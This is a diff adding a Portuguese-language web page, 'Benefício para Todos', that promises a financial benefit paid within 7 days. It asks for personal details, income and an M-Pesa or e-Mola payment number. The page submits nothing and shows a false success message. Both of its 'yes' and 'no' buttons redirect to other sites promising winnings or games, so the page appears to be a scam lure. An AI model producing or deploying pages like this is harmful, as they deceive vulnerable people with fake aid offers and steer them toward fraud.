@@ -1,0 +1,99 @@
+
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Benefício para Todos</title>
+  <style>
+    body {
+      background-color: #121212;
+      color: white;
+      font-family: Arial, sans-serif;
+      padding: 20px;
+      text-align: center;
+    }
+    form {
+      max-width: 500px;
+      margin: 0 auto;
+      text-align: left;
+    }
+    label {
+      display: block;
+      margin-top: 15px;
+    }
+    input, select, textarea {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      border-radius: 5px;
+      border: none;
+    }
+    button {
+      margin-top: 20px;
+      padding: 10px 20px;
+      font-size: 16px;
+      cursor: pointer;
+      background-color: #1e88e5;
+      color: white;
+      border: none;
+      border-radius: 5px;
+    }
+    #confirmation {
+      display: none;
+      margin-top: 30px;
+    }
+    .decision-buttons {
+      margin-top: 20px;
+    }
+    .decision-buttons button {
+      margin: 0 10px;
+      background-color: #43a047;
+    }
+  </style>
+</head>
+<body>
+  <h1>Benefício para Todos</h1>
+  <p>Preencha este formulário para se registar no nosso sistema de apoio financeiro. O pagamento será realizado dentro de 7 dias após análise dos dados.</p>
+  
+  <form id="benefitForm">
+    <label>Nome completo:<input type="text" required></label>
+    <label>Idade:<input type="number" required></label>
+    <label>Número de telefone:<input type="tel" required></label>
+    <label>Província:<input type="text" required></label>
+    <label>Ocupação:<input type="text" required></label>
+    <label>Renda mensal:<input type="number" required></label>
+    <label>Número de dependentes:<input type="number" required></label>
+    <label>Precisa de apoio específico?<textarea></textarea></label>
+    <label>Método de pagamento:
+      <select required>
+        <option value="">Selecione</option>
+        <option value="mpesa">M-Pesa</option>
+        <option value="emola">e-Mola</option>
+      </select>
+    </label>
+    <label>Número da conta (telefone para pagamento):<input type="tel" required></label>
+    <button type="submit">Enviar</button>
+  </form>
+
+  <div id="confirmation">
+    <p>Obrigado pelo envio. O seu pedido foi registado com sucesso. O pagamento será realizado dentro de 7 dias úteis.</p>
+    <p>Deseja continuar com as nossas outras atividades?</p>
+    <div class="decision-buttons">
+      <button onclick="location.href='https://ganhe-10000mts.vercel.app'">Sim</button>
+      <button onclick="location.href='https://supergamespribe.vercel.app'">Não</button>
+    </div>
+  </div>
+
+  <script>
+    const form = document.getElementById('benefitForm');
+    const confirmation = document.getElementById('confirmation');
+
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+      form.style.display = 'none';
+      confirmation.style.display = 'block';
+    });
+  </script>
+</body>
+</html>
